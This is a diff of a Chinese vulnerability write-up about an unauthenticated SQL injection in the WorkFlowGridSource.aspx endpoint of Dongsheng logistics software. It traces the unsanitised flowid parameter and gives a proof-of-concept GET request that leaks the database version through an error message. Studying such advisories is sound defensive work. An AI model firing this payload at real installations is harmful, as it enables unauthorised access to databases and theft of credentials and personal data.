@@ -6,7 +6,7 @@ asset_dir: embedded-base64
 
 # 漏洞简介
 
-东胜物流[软件](#)是青岛东胜伟业软件有限公司一款集订单管理、仓库管理、运输管理等多种功能于一体的物流管理软件。东胜物流信息管理系统 WorkFlowGridSource.aspx 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用[SQL注入漏洞](https://mrxn.net/tag/SQL注入)获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+东胜物流[软件](#)是青岛东胜伟业软件有限公司一款集订单管理、仓库管理、运输管理等多种功能于一体的物流管理软件。东胜物流信息管理系统 WorkFlowGridSource.aspx 接口存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5 "标签：SQL注入")[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")，未经身份验证的远程攻击者除了可以利用[SQL注入漏洞](https://mrxn.net/tag/SQL注入)获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
 
 软件
 
@@ -34,14 +34,6 @@ protected void Page_Load(object sender, EventArgs e)
       this.Response.Write(this.GetWorkFlowSteps(this.strWorkFlowID));
 ```
 
-深入探索
-
-计算机科学
-
-搜索引擎
-
-网络
-
 主要就是根据`handle`参数的值来进行处理不同的分支逻辑
 
 编程
@@ -55,9 +47,17 @@ protected void Page_Load(object sender, EventArgs e)
     StringBuilder stringBuilder = new StringBuilder();
 ```
 
-`tempWorkFlowID`参数（即`flowid`）的值被直接拼接在`GetDataSetBySql`语句里执行，全程无过滤或校验，导致[SQL注入](https://mrxn.net/tag/SQL注入)漏洞。
+`tempWorkFlowID`参数（即`flowid`）的值被直接拼接在`GetDataSetBySql`语句里执行，全程无过滤或校验，导致[SQL注入](https://mrxn.net/tag/SQL注入)[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")。
 
 # 漏洞复现
+
+深入探索
+
+防病毒程序与恶意软件
+
+搜索引擎
+
+代理
 
 ```
 GET /WorkFlow/WorkFlowGridSource.aspx?handle=steplist&flowid='-1/user-- HTTP/1.1
@@ -68,4 +68,4 @@ Host: dongsheng.mrxn.net
 
 通过报错注入在响应里回显数据库版本信息。
 
-网络安全
+计算机安全
